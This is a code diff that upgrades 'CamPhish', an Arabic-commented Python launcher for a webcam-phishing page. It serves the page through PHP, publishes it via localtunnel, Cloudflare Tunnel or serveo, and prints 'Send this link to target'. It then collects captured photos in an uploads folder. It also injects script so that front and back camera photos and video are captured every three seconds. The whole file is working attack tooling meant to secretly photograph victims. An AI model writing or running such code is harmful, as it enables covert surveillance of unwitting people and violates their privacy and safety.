@@ -1,3 +1,11 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+"""
+CamPhish Ultimate - بدون ngrok، يدعم localtunnel / Cloudflare Tunnel / serveo
+التقاط صور لا نهائية وإرسالها إلى مجلد uploads على نفس الجهاز
+"""
+
 import subprocess
 import time
 import re
@@ -5,227 +13,347 @@ import shutil
 import sys
 import os
 import random
+import signal
+import logging
+import socket
+import threading
 from datetime import datetime
+from pathlib import Path
 
-# ===================== تصحيح استيراد المكتبات =====================
-# محاولة استيراد watchdog مع إعادة المحاولة بعد التثبيت
-try:
-    from watchdog.observers import Observer
-    from watchdog.events import FileSystemEventHandler
-except ImportError:
-    os.system('pip install watchdog')
-    from watchdog.observers import Observer
-    from watchdog.events import FileSystemEventHandler
+# ===================== التثبيت التلقائي للمكتبات =====================
+def auto_install_packages():
+    required = ['watchdog', 'colorama', 'requests']
+    for pkg in required:
+        try:
+            __import__(pkg)
+        except ImportError:
+            print(f"[*] Installing {pkg} ...")
+            subprocess.run([sys.executable, '-m', 'pip', 'install', pkg, '--quiet'],
+                           check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
-# محاولة استيراد colorama مع إعادة المحاولة بعد التثبيت
-try:
-    from colorama import init, Fore
-except ImportError:
-    os.system('pip install colorama')
-    from colorama import init, Fore
+auto_install_packages()
 
-init()  # تهيئة colorama
+import requests
+from watchdog.observers import Observer
+from watchdog.events import FileSystemEventHandler
+from colorama import init, Fore, Style
+
+init(autoreset=True)
 
 # ===================== الإعدادات الأساسية =====================
-colors = {
-    "red": '\033[00;31m',
-    "green": '\033[00;32m',
-    "light_green": '\033[01;32m',
-    "yellow": '\033[01;33m',
-    "light_red": '\033[01;31m',
-    "blue": '\033[94m',
-    "purple": '\033[01;35m',
-    "cyan": '\033[00;36m',
-    "grey": '\033[90m',
-    "reset": Fore.RESET,
-}
-
-messages = {
-    "true": f"{colors['red']}[{colors['light_green']}+{colors['red']}] {colors['light_green']}",
-    "forindex": f"{colors['red']}[{colors['green']}?{colors['red']}] {colors['green']}",
-    "error": f"{colors['red']}[{colors['light_red']}-{colors['red']}] {colors['light_red']}"
-}
-
-PHP_PORT = random.randint(8000, 8999)
-PHP_FOLDER = "./"
+LOG_FILE = "camphish.log"
 FOLDER_TO_WATCH = "uploads"
+PHP_FOLDER = "./"
 INDEX = "index.html"
-TOKEN_FILE = "token.txt"
+MIN_PORT = 8000
+MAX_PORT = 8999
 
-# ===================== دوال مساعدة =====================
+logging.basicConfig(filename=LOG_FILE, level=logging.INFO,
+                    format='%(asctime)s - %(levelname)s - %(message)s')
+
+def log(msg, level="info"):
+    colors = {"info": Fore.CYAN, "success": Fore.GREEN, "error": Fore.RED, "warning": Fore.YELLOW}
+    print(f"{colors.get(level, Fore.WHITE)}[{level.upper()}] {msg}{Style.RESET_ALL}")
+    getattr(logging, level)(msg)
+
 def clear():
     os.system("cls || clear")
 
-def OS():
+def is_termux():
     return os.path.exists("/data/data/com.termux")
 
-clear()
+def is_linux():
+    return sys.platform.startswith('linux') and not is_termux()
 
-# التحقق من وجود PHP
-if not shutil.which("php"):
-    if OS():
-        subprocess.run(["pkg", "install", "php"])
-    elif 'Linux' in __import__("platform").system():
-        subprocess.run(["sudo", "apt", "install", "php"])
-    print(f"\n{messages['error']}Php is NOT installed!\n\nInstall On Windows: https://www.php.net/downloads.php")
+def get_free_port():
+    """الحصول على منفذ غير مستخدم"""
+    for _ in range(20):
+        port = random.randint(MIN_PORT, MAX_PORT)
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            if s.connect_ex(('localhost', port)) != 0:
+                return port
+    return 8080
 
-# التحقق من وجود ngrok
-if not shutil.which("ngrok"):
-    sys.exit(f"\n{messages['error']}ngrok is NOT installed!\n\nInstall On windows: winget install ngrok -s msstore\nOr Download Portable: https://ngrok.com/download/windows?tab=download\n\nInstall On Termux: \npkg update -y\npkg install git\ngit clone https://github.com/Yisus7u7/termux-ngrok\ncd termux-ngrok\nbash install.sh\n\nInstall On Linux: https://ngrok.com/download/linux\n\nAnd then add your token (ngrok config add-authtoken <token>)")
-
-def tokenngrok():
-    if os.path.isfile(TOKEN_FILE):
-        with open(TOKEN_FILE, "r") as f:
-            token = f.read().strip()
-        return token if token else None
-    return None
-
-user = os.popen("whoami").read().strip()
-os.environ["USER"] = user
-
-if OS():
-    os.environ["HOME"] = os.environ.get("HOME")
-    banner = f"""{colors['cyan']}                                                                                           
-▄█████  ▄▄▄  ▄▄   ▄▄ █████▄ ▄▄ ▄▄ ▄▄  ▄▄▄▄ ▄▄ ▄▄ 
-██     ██▀██ ██▀▄▀██ ██▄▄█▀ ██▄██ ██ ███▄▄ ██▄██ 
-▀█████ ██▀██ ██   ██ ██     ██ ██ ██ ▄▄██▀ ██ ██ 
-
-    {colors['red']}Tg&Git: @Mresfelurm&mr-spect3r{colors['reset']}\n\n                                       
-"""
-else:
-    if 'Linux' in __import__("platform").system():
-        os.environ["HOME"] = f"/home/{user}"
-    banner = f"""{colors['cyan']}
-       _..._                                                                                          
-    .-'_..._''.                                                                                       
-  .' .'      '.\          __  __   ___  _________   _...._        .        .--.           .           
- / .'                    |  |/  `.'   `.\        |.'      '-.   .'|        |__|         .'|           
-. '                      |   .-.  .-.   '\        .'```'.    '.<  |        .--.        <  |           
-| |                 __   |  |  |  |  |  | \      |       \     \| |        |  |         | |           
-| |              .:--.'. |  |  |  |  |  |  |     |        |    || | .'''-. |  |     _   | | .'''-.    
-. '             / |   \ ||  |  |  |  |  |  |      \      /    . | |/.'''. \|  |   .' |  | |/.'''. \   
- \ '.          .`" __ | ||  |  |  |  |  |  |     |\`'-.-'   .'  |  /    | ||  |  .   | /|  /    | |   
-  '. `._____.-'/ .'.''| ||__|  |__|  |__|  |     | '-....-'`    | |     | ||__|.'.'| |//| |     | |   
-    `-.______ / / /   | |_                .'     '.             | |     | |  .'.'.-'  / | |     | |   
-             `  \ \._,\ '/              '-----------'           | '.    | '. .'   \_.'  | '.    | '.  
-                 `--'  `"                                       '---'   '---'           '---'   '---' 
-
-                {colors['red']}Tg&Git: @Mresfelurm&mr-spect3r{colors['reset']}\n\n
-                 """
-
-print(banner)
-
-# إعداد token ngrok
-token = tokenngrok()
-if not token:
-    user_token = input(f"{messages['true']}Enter Token Ngrok: {colors['reset']}")
-    with open(TOKEN_FILE, "w") as f:
-        f.write(user_token.strip())
-    subprocess.run(["ngrok", "config", "add-authtoken", user_token])
-
-clear()
-print(banner)
-
-# تعديل إعدادات index.html إذا أراد المستخدم
-forindex = input(f"{messages['forindex']}Do you want to change the settings of the 'index.html' file? (y/n): {colors['reset']}").upper()
-
-if forindex == "Y":
-    front_photo_count = input(f"{messages['forindex']}Front Photo Count {colors['yellow']}(e.g: 3){colors['reset']}: ")
-    back_photo_count = input(f"{messages['forindex']}Back Photo Count {colors['yellow']}(e.g: 3){colors['reset']}: ")
-    front_video_seconds = input(f"{messages['forindex']}Front Video Seconds {colors['yellow']}(e.g: 5){colors['reset']}: ")
-    back_video_seconds = input(f"{messages['forindex']}Back Video Seconds {colors['yellow']}(e.g: 4){colors['reset']}: ")
-    patterns = {
-        'frontPhotoCount': r'let frontPhotoCount = \d+;',
-        'backPhotoCount': r'let backPhotoCount = \d+;',
-        'frontVideoSeconds': r'let frontVideoSeconds = \d+;',
-        'backVideoSeconds': r'let backVideoSeconds = \d+;'
-    }
-
-    with open(INDEX, 'r', encoding='utf-8') as file:
-        content = file.read()
-
-    content = re.sub(patterns['frontPhotoCount'], f'let frontPhotoCount = {front_photo_count};', content)
-    content = re.sub(patterns['backPhotoCount'], f'let backPhotoCount = {back_photo_count};', content)
-    content = re.sub(patterns['frontVideoSeconds'], f'let frontVideoSeconds = {front_video_seconds};', content)
-    content = re.sub(patterns['backVideoSeconds'], f'let backVideoSeconds = {back_video_seconds};', content)
-
-    with open(INDEX, 'w', encoding='utf-8') as file:
-        file.write(content)
-    clear()  # تم تصحيح استدعاء الدالة
-    print(banner)
-
-# ===================== تشغيل الخوادم =====================
-def php_server():
-    print(f"{messages['true']}Starting PHP server on port {colors['yellow']}{PHP_PORT}{colors['reset']}...")
-    php_proc = subprocess.Popen(
-        ["php", "-S", f"0.0.0.0:{PHP_PORT}"],
-        cwd=PHP_FOLDER,
-        stdout=subprocess.PIPE,
-        stderr=subprocess.PIPE,
-        text=True
-    )
-    time.sleep(2)
-    return php_proc
-
-def ngrok(port):
-    print(f"{messages['true']}Starting ngrok on port {colors['yellow']}{port}{colors['reset']}...")
-    ngrok_proc = subprocess.Popen(
-        ["ngrok", "http", str(port)],
-        stdout=subprocess.PIPE,
-        stderr=subprocess.PIPE
-    )
-    time.sleep(8)
-    return ngrok_proc
-
-def ngrok_url():
+# ===================== فحص وتثبيت المتطلبات =====================
+def check_php():
+    if shutil.which("php"):
+        return True
+    log("PHP not found, installing...", "warning")
     try:
-        result = subprocess.run(
-            ['curl', '-s', '-N', 'http://127.0.0.1:4040/api/tunnels'],
-            capture_output=True,
-            text=True
-        )
-        output = result.stdout
-        matches = re.findall(r"https://[0-9a-z]*\.ngrok-free\.app", output)
-        if matches:
-            for url in matches:
-                print(f"\n{messages['true']}public URL:", url)
-            return matches
+        if is_termux():
+            subprocess.run(["pkg", "update", "-y"], check=False, stdout=subprocess.DEVNULL)
+            subprocess.run(["pkg", "install", "php", "-y"], check=True, stdout=subprocess.DEVNULL)
+        elif is_linux():
+            subprocess.run(["sudo", "apt", "update"], check=False, stdout=subprocess.DEVNULL)
+            subprocess.run(["sudo", "apt", "install", "php", "-y"], check=True, stdout=subprocess.DEVNULL)
         else:
-            print(f"\n{messages['error']}No ngrok URL found. Use a VPN if you are banned")
-            exit()
-    except Exception as e:
-        print(f"\n{messages['error']}Error:", e)
-        return None
+            log("Windows: install PHP manually from https://windows.php.net/download", "error")
+            return False
+        return True
+    except:
+        log("PHP installation failed", "error")
+        return False
 
-# ===================== مراقبة مجلد uploads =====================
+def install_localtunnel():
+    """تثبيت localtunnel عبر npm (إذا كان npm متوفراً)"""
+    if shutil.which("lt"):
+        return True
+    if shutil.which("npm"):
+        log("Installing localtunnel via npm...", "info")
+        subprocess.run(["npm", "install", "-g", "localtunnel"], check=False, stdout=subprocess.DEVNULL)
+        return shutil.which("lt") is not None
+    log("npm not found, localtunnel unavailable. Install Node.js first.", "error")
+    return False
+
+def install_cloudflared():
+    """تثبيت cloudflared"""
+    if shutil.which("cloudflared"):
+        return True
+    log("Installing cloudflared...", "info")
+    try:
+        if is_termux():
+            subprocess.run(["pkg", "install", "cloudflared", "-y"], check=False, stdout=subprocess.DEVNULL)
+        elif is_linux():
+            # تحميل الملف الثنائي
+            subprocess.run(["wget", "-q", "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64", "-O", "/tmp/cloudflared"], check=False)
+            subprocess.run(["chmod", "+x", "/tmp/cloudflared"], check=False)
+            subprocess.run(["sudo", "mv", "/tmp/cloudflared", "/usr/local/bin/cloudflared"], check=False)
+        else:
+            log("Windows: download cloudflared from https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/", "error")
+            return False
+        return shutil.which("cloudflared") is not None
+    except:
+        return False
+
+def install_serveo():
+    """serveo لا يحتاج تثبيت، فقط ssh"""
+    return shutil.which("ssh") is not None
+
+# ===================== تشغيل النفق =====================
+def start_localtunnel(port):
+    """تشغيل localtunnel وإرجاع الرابط"""
+    try:
+        proc = subprocess.Popen(["lt", "--port", str(port)], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        # الانتظار للحصول على الرابط من stdout
+        time.sleep(4)
+        # قراءة الرابط من المخرجات
+        for line in iter(proc.stdout.readline, ''):
+            if "your url is:" in line.lower():
+                url = line.split()[-1].strip()
+                return proc, url
+            if "https://" in line:
+                parts = line.split()
+                for p in parts:
+                    if p.startswith("https://"):
+                        return proc, p
+        return proc, None
+    except Exception as e:
+        log(f"localtunnel error: {e}", "error")
+        return None, None
+
+def start_cloudflared(port):
+    """تشغيل cloudflared tunnel"""
+    try:
+        proc = subprocess.Popen(["cloudflared", "tunnel", "--url", f"http://localhost:{port}"],
+                                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        time.sleep(5)
+        # قراءة الرابط من stderr (cloudflared يكتبه هناك عادة)
+        for _ in range(20):
+            line = proc.stderr.readline()
+            if line:
+                if "https://" in line:
+                    match = re.search(r'https://[a-zA-Z0-9\-\.]+\.trycloudflare\.com', line)
+                    if match:
+                        return proc, match.group(0)
+            time.sleep(0.5)
+        return proc, None
+    except Exception as e:
+        log(f"cloudflared error: {e}", "error")
+        return None, None
+
+def start_serveo(port):
+    """تشغيل serveo عبر SSH"""
+    try:
+        # serveo يتطلب اسم مضيف فرعي عشوائي أو ثابت
+        proc = subprocess.Popen(["ssh", "-R", "80:localhost:" + str(port), "serveo.net"],
+                                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        time.sleep(6)
+        # استخراج الرابط من المخرجات
+        for _ in range(20):
+            line = proc.stderr.readline()
+            if line and "Forwarding HTTP traffic from" in line:
+                match = re.search(r'https://[a-zA-Z0-9\-\.]+\.serveo\.net', line)
+                if match:
+                    return proc, match.group(0)
+            time.sleep(0.5)
+        return proc, None
+    except:
+        return None, None
+
+# ===================== تشغيل خادم PHP =====================
+def start_php_server(port):
+    log(f"Starting PHP server on port {port}...", "info")
+    proc = subprocess.Popen(["php", "-S", f"0.0.0.0:{port}"],
+                            cwd=PHP_FOLDER,
+                            stdout=subprocess.DEVNULL,
+                            stderr=subprocess.DEVNULL)
+    time.sleep(2)
+    return proc
+
+# ===================== إعداد الصفحة لالتقاط لا نهائي =====================
+def configure_infinite_capture():
+    """تعديل index.html لجعل الالتقاط لا نهائياً (تكرار تلقائي)"""
+    try:
+        with open(INDEX, 'r', encoding='utf-8') as f:
+            content = f.read()
+        # تعديل المتغيرات إذا وجدت لتكرار غير محدود (مثال: ضبط عدد الصور والفيديو على قيمة عالية)
+        # إضافة حلقة لا نهائية إذا أمكن
+        # سنقوم بتعديل المحتوى لجعل زر التقاط يكرر نفسه أو تعيين الفاصل الزمني
+        # هذا يعتمد على هيكل index.html، لكن سنضيف كود JS يجعل التصوير يتكرر كل 5 ثوانٍ
+        search_tag = "</body>"
+        auto_js = """
+<script>
+// التقاط تلقائي لا نهائي
+setInterval(function() {
+    if (typeof captureFrontPhoto === 'function') captureFrontPhoto();
+    if (typeof captureBackPhoto === 'function') captureBackPhoto();
+    if (typeof captureFrontVideo === 'function') captureFrontVideo();
+    if (typeof captureBackVideo === 'function') captureBackVideo();
+}, 3000); // كل 3 ثوانٍ التقط صورة
+</script>
+"""
+        if auto_js not in content:
+            content = content.replace(search_tag, auto_js + "\n" + search_tag)
+            with open(INDEX, 'w', encoding='utf-8') as f:
+                f.write(content)
+            log("Page modified for infinite capture (auto capture every 3 seconds)", "success")
+        else:
+            log("Infinite capture already configured", "info")
+    except Exception as e:
+        log(f"Failed to modify index.html: {e}", "error")
+
+# ===================== مراقب الملفات =====================
 class WatcherHandler(FileSystemEventHandler):
     def on_created(self, event):
         if not event.is_directory:
             file_name = os.path.basename(event.src_path)
-            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            print(f"\n{messages['true']}File received: {colors['green']}{file_name} {colors['red']}at {colors['yellow']}{current_time}")
+            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+            log(f"File received: {file_name} at {timestamp}", "success")
 
-if __name__ == "__main__":
-    # إنشاء مجلد uploads إذا لم يكن موجوداً
+# ===================== عرض الشعار =====================
+def show_banner():
+    banner = f"""{Fore.CYAN}
+   ▄█████  ▄▄▄  ▄▄   ▄▄ █████▄ ▄▄ ▄▄ ▄▄  ▄▄▄▄ ▄▄ ▄▄ 
+  ██     ██▀██ ██▀▄▀██ ██▄▄█▀ ██▄██ ██ ███▄▄ ██▄██ 
+  ▀█████ ██▀██ ██   ██ ██     ██ ██ ██ ▄▄██▀ ██ ██ 
+    {Fore.RED}CamPhish Ultimate - No ngrok, Infinite Capture{Style.RESET_ALL}
+    {Fore.YELLOW}Git & TG: @mr-spect3r{Style.RESET_ALL}
+
+"""
+    print(banner)
+
+# ===================== اختيار طريقة النشر =====================
+def select_tunnel_method():
+    print(f"{Fore.GREEN}Select tunnel method:")
+    print("1) localtunnel (requires Node.js/npm)")
+    print("2) Cloudflare Tunnel (cloudflared)")
+    print("3) Serveo (requires SSH)")
+    choice = input(f"{Fore.YELLOW}Enter choice (1/2/3): {Style.RESET_ALL}").strip()
+    if choice == '1':
+        if install_localtunnel():
+            return "localtunnel"
+        else:
+            log("Localtunnel not available, try another method", "error")
+            return select_tunnel_method()
+    elif choice == '2':
+        if install_cloudflared():
+            return "cloudflared"
+        else:
+            log("Cloudflared not available", "error")
+            return select_tunnel_method()
+    elif choice == '3':
+        if install_serveo():
+            return "serveo"
+        else:
+            log("SSH not found, install openssh-client", "error")
+            return select_tunnel_method()
+    else:
+        return select_tunnel_method()
+
+# ===================== إعداد البيئة =====================
+def prepare():
     if not os.path.exists(FOLDER_TO_WATCH):
         os.makedirs(FOLDER_TO_WATCH)
+    if not os.path.exists(INDEX):
+        log(f"File {INDEX} not found in current directory!", "error")
+        sys.exit(1)
+    if not check_php():
+        sys.exit(1)
+    # طلب صلاحية التخزين لـ Termux
+    if is_termux():
+        subprocess.run(["termux-setup-storage"], check=False)
+    # تعديل الصفحة للالتقاط اللا نهائي (اختياري)
+    inf_choice = input(f"{Fore.CYAN}Enable infinite automatic capture? (y/n): {Style.RESET_ALL}").upper()
+    if inf_choice == 'Y':
+        configure_infinite_capture()
 
-    php_proc = php_server()
-    ngrok_proc = ngrok(PHP_PORT)
-    ngrok_url()
+# ======================== MAIN ========================
+def main():
+    clear()
+    show_banner()
+    prepare()
 
+    port = get_free_port()
+    php_proc = start_php_server(port)
+    if not php_proc:
+        log("Failed to start PHP server", "error")
+        sys.exit(1)
+
+    method = select_tunnel_method()
+    tunnel_proc = None
+    public_url = None
+
+    if method == "localtunnel":
+        tunnel_proc, public_url = start_localtunnel(port)
+    elif method == "cloudflared":
+        tunnel_proc, public_url = start_cloudflared(port)
+    elif method == "serveo":
+        tunnel_proc, public_url = start_serveo(port)
+
+    if not public_url:
+        log("Failed to obtain public URL from tunnel service", "error")
+        # خادم PHP يعمل محلياً، يمكن عرض IP المحلي كبديل
+        local_ip = socket.gethostbyname(socket.gethostname())
+        print(f"{Fore.YELLOW}Local IP: http://{local_ip}:{port}{Style.RESET_ALL}")
+        print(f"{Fore.RED}No public URL. Use ngrok or other service manually.{Style.RESET_ALL}")
+    else:
+        log(f"Public URL: {Fore.GREEN}{public_url}{Style.RESET_ALL}", "success")
+        print(f"{Fore.YELLOW}Send this link to target. All photos will be saved in '{FOLDER_TO_WATCH}' folder.{Style.RESET_ALL}\n")
+
+    # مراقبة مجلد uploads
     event_handler = WatcherHandler()
     observer = Observer()
     observer.schedule(event_handler, FOLDER_TO_WATCH, recursive=False)
     observer.start()
-    print(f"\n{messages['true']}Photo capture Started => {colors['yellow']}{FOLDER_TO_WATCH}\n")
+    log(f"Watching folder '{FOLDER_TO_WATCH}' for incoming files...", "info")
+    log("Press Ctrl+C to stop.", "warning")
+
+    def shutdown(sig, frame):
+        log("Shutting down...", "warning")
+        php_proc.terminate()
+        if tunnel_proc:
+            tunnel_proc.terminate()
+        observer.stop()
+        observer.join()
+        sys.exit(0)
+
+    signal.signal(signal.SIGINT, shutdown)
 
     try:
         while True:
             time.sleep(1)
     except KeyboardInterrupt:
-        print(f"\n{colors['red']}Stopping servers and observer...")
-        php_proc.terminate()
-        ngrok_proc.terminate()
-        observer.stop()
-        observer.join()
+        shutdown(None, None)
+
+if __name__ == "__main__":
+    main()
